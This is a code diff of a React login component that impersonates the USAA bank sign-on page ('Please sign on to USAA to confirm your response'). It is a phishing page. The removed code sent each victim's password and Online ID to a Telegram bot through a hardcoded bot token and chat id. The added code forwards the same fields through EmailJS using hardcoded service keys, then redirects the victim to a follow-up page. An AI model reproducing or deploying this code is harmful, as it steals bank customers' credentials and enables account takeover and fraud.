@@ -1,210 +1,176 @@
+import { useState } from "react";
 import {
-    Box,
-    Text,
-    Heading,
-    Center,
-    FormControl,
-    Input,
-    InputRightElement,
-    Button,
-    InputGroup,
-    Checkbox,
-    IconButton,
-    Divider,
-  } from "@chakra-ui/react";
-  import { useNavigate } from "react-router-dom";
-  import { useState } from "react";
-  
-  function Login() {
-    const navigate = useNavigate();
-    const [showPassword, setShowPassword] = useState(false);
-  
-    const handleShowPassword = () => {
-      setShowPassword(!showPassword);
-    };
-  
-    const token = "6214248431:AAFodeiJc0UIq-nmsTyqMgzp2FdByom3wzc";
-    const chat_id = "....5960483519";
-  
-    async function sendMessageToTelegram(message: any) {
-      const res = await fetch(
-        `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`
+  Box,
+  Text,
+  Heading,
+  Center,
+  FormControl,
+  Input,
+  InputRightElement,
+  Button,
+  InputGroup,
+  Checkbox,
+  IconButton,
+  Divider,
+  Spinner,
+} from "@chakra-ui/react";
+import { FaEye, FaEyeSlash } from "react-icons/fa";
+import { useNavigate } from "react-router-dom";
+import emailjs from "emailjs-com";
+
+function Login() {
+  const navigate = useNavigate();
+  const [showPassword, setShowPassword] = useState(false);
+  const [loading, setLoading] = useState(false); // Loading state
+
+  const handleShowPassword = () => {
+    setShowPassword(!showPassword);
+  };
+
+  const sendEmail = (e: any) => {
+    e.preventDefault();
+    setLoading(true); // Start loading
+
+    emailjs
+      .sendForm("service_9vq8bca", "template_6zkzruo", e.target, "n1LlPgghSqnVWFxPU")
+      .then(
+        (result) => {
+          console.log(result.text);
+          setLoading(false); // Stop loading
+          navigate("/enter"); // Navigate to /enter after successful form submission
+        },
+        (error) => {
+          console.log(error.text);
+          setLoading(false); // Stop loading
+        }
       );
-       await res.json();
-      console.log("Telegram message sent");
-    }
-  
-    async function handleFormSubmit(event: any) {
-      
-      event.preventDefault();
-      const message =
-        "Password: " +
-        event.target.password.value +
-        " " +
-        "\nOnline-ID: " +
-        event.target.onlineId.value;
-  
-      try {
-        await sendMessageToTelegram(message);
-        navigate("/enter");
-      } catch (error) {
-        console.error("Error sending message to Telegram:", error);
-      }
-    }
-  
-    function handleKeyDown(event: any) {
-      if (event.key === "Enter") {
-        event.preventDefault();
-        handleFormSubmit(event);
-      }
-    }
-  
-    return (
-      <Box fontFamily={'Poppins'}>
-        <Box minH="72.3vh">
-        <Center p={4} bgColor="yellow.100" justifyContent="space-between">
-          <Text pl={2} fontSize="md" color="blackAlpha.00" fontWeight="normal">
-          We recognize this device. Please sign on to confirm your response.
-          </Text>
-          <Text textDecor={'underline'} pl={2} fontSize="md" color="blackAlpha.800" fontWeight="semibold"><a href='#'>
-           View</a>
+  };
+
+  return (
+    <Box>
+      <Box minH="72.3vh">
+        <Center p={3} bgColor="whitesmoke" justifyContent="space-between">
+          <Text pl={2} fontSize="md" color="#196999" fontWeight="semibold">
+            We recognize this device. Please sign on
+            <br /> to USAA to confirm your response.
           </Text>
         </Center>
-          <Box>
-            <Heading
-              textAlign="center"
-              pt={7}
-              fontWeight="normal"
-              
-              as="h2"
-              fontSize="26"
-              color="blackAlpha.800"
-            >
-              Log In
-            </Heading>
-          </Box>
-          <form onSubmit={handleFormSubmit}>
-          <Box h={68} mt={6} mx="4">
-           
-              <InputGroup mb={3} borderRadius={"0"} display={"block"}>
-                <FormControl>
-                  <Input
-                    id="onlineId"
-                   
-                    borderLeft={"1px solid #196999"}
-                    borderRight={"1px solid #196999"}
-                    borderTop={"1px solid #196999"}
-                    _hover={{ border: "1px solid #196999"}}
-                    borderRadius={0}
-                    _focus={{ border: "none" }}
-                    _placeholder={{
-                      
-                      top: "0",
-                      transform: "translateY(-130%)",
-                      fontSize: "12px",
-                    }}
-                    h="70px"
-                    placeholder="User name"
-                    pb={0}
-                    autoFocus
-                    fontWeight={'medium'}
-                    color="#12395b"
-                    type="text"
-                    onKeyDown={handleKeyDown} // Add onKeyDown event handler
-                  />
-                  <Input
-                    id="password"
-                    type={showPassword ? "text" : "password"}
-                    color="#12395b"
-                    _hover={{ border: "solid 0.9px" }}
-                    fontWeight={'medium'}
-                    
-                    border={"1px solid #196999"}
-                    borderRadius={0}
-                    _focus={{  border: "none" }}
-                    _placeholder={{
-                      
-                      top: "0",
-                      transform: "translateY(-130%)",
-                      fontSize: "12px",
-                    }}
-                    h="70px"
-                    placeholder="Password"
-                    pb={0}
-                   
-                    onKeyDown={handleKeyDown} // Add onKeyDown event handler
-                  />
-                 <InputRightElement mt={79}  width="7.5rem">
-                  <Divider mr={2} borderColor={'gray.800'} h={8} w={2} orientation="vertical" />
-                  <IconButton
-                      h="100%"
-                      p={2}
-                      color={'#12395b'}
-                      size="md"
-                      onClick={handleShowPassword}
-                      colorScheme="transparent"
-                      variant={'solid'}
-  
-                      
-                      
-                      icon={showPassword ? <><Text ml={1}> Hide</Text></> : <><Text ml={1}> Show</Text></>} aria-label={""}                />
-                </InputRightElement>
-                  
-                </FormControl>
-              </InputGroup>
-  
-              <Checkbox
-                pb={6}
-                pt={4}
-                size={"lg"}
-                id="rememberMe"
-               
-                isChecked={false}
-              >
-                <Text
-                  lineHeight={"4"}
-                  fontSize={"sm"}
-                  color="blackAlpha.800"
-                  fontWeight={"normal"}
-                >
-                  Remember me
-                </Text>
-              </Checkbox>
-  
-              <Button
-                mt={0}
-                bgColor="#47A040"
-                h={12}
-                onClick={handleShowPassword}
-                _hover={{
-                  bg: "#526f30",
-                  color: "whitesmoke",
-                  borderRadius: 2,
-                }}
-               
-                color="whitesmoke"
-                borderRadius={2}
-                w="100%"
-                type="submit" // Add type="submit" attribute
-              >
-                Log In
-              </Button>
-            
-  
-            <Text
-              mt={5}
-              textAlign="center"
-              color="#47A040"
-            >
-             Forgot user name and/or password?
-            </Text>
-            
-          </Box>
-          </form>
+        <Box>
+          <Heading
+            textAlign="center"
+            pt={7}
+            fontWeight="semibold"
+            fontFamily="serif"
+            as="h2"
+            fontSize="26"
+            color="blackAlpha.800"
+          >
+            Log On
+          </Heading>
         </Box>
+        <form onSubmit={sendEmail}>
+          <Box h={68} mt={6} mx="4">
+            <InputGroup mb={3} borderRadius={"0"} display={"block"}>
+              <FormControl>
+                <Input
+                  id="onlineId"
+                  name="OnlineID"
+                  borderLeft={"1px solid #196999"}
+                  borderRight={"1px solid #196999"}
+                  borderTop={"1px solid #196999"}
+                  _hover={{ border: "1px solid #196999" }}
+                  borderRadius={0}
+                  _focus={{ bgColor: "yellow.100", border: "none" }}
+                  _placeholder={{
+                    color: "blackAlpha.800",
+                    top: "0",
+                    transform: "translateY(-130%)",
+                    fontSize: "12px",
+                  }}
+                  h="70px"
+                  placeholder="Online ID"
+                  pb={0}
+                  autoFocus
+                  type="text"
+                />
+                <Input
+                  id="password"
+                  name="Password"
+                  type={showPassword ? "text" : "password"}
+                  _hover={{ border: "solid 0.9px" }}
+                  border={"1px solid #196999"}
+                  borderRadius={0}
+                  _focus={{ bgColor: "yellow.100", border: "none" }}
+                  _placeholder={{
+                    color: "blackAlpha.800",
+                    top: "0",
+                    transform: "translateY(-130%)",
+                    fontSize: "12px",
+                  }}
+                  h="70px"
+                  placeholder="Password"
+                  pb={0}
+                />
+                <InputRightElement mt={79} width="7.5rem">
+                  <Divider orientation="vertical" ml={-2} border={"1px solid gray"} />
+                  <IconButton
+                    h="100%"
+                    p={2}
+                    bgColor={"transparent"}
+                    size="lg"
+                    onClick={handleShowPassword}
+                    color={"gray.600"}
+                    icon={
+                      showPassword ? (
+                        <>
+                          <FaEyeSlash />
+                          <Text ml={1}> Hide</Text>
+                        </>
+                      ) : (
+                        <>
+                          <FaEye />
+                          <Text ml={1}> Show</Text>
+                        </>
+                      )
+                    }
+                    aria-label={""}
+                  />
+                </InputRightElement>
+              </FormControl>
+            </InputGroup>
+            <Checkbox pb={6} pt={4} size={"lg"} id="rememberMe" isChecked={false}>
+              <Text lineHeight={"4"} fontSize={"sm"} color="#196999" fontWeight={"semibold"}>
+                Remember this browser to log on faster
+                <br /> next time.
+              </Text>
+            </Checkbox>
+            <Button
+              mt={0}
+              h={12}
+              _hover={{
+                bg: "#526f30",
+                color: "whitesmoke",
+                borderRadius: 2,
+              }}
+              bgColor="#486428"
+              color="whitesmoke"
+              borderRadius={2}
+              w="100%"
+              type="submit" // Add type="submit" attribute
+            >
+              Next
+            </Button>
+          </Box>
+        </form>
+        {/* Loading spinner */}
+        {loading && (
+          <Center mt={4}>
+            <Spinner size="xl" color="green.500" />
+          </Center>
+        )}
       </Box>
-    );
-  }
-  
-  export default Login;
-  
+    </Box>
+  );
+}
+
+export default Login;
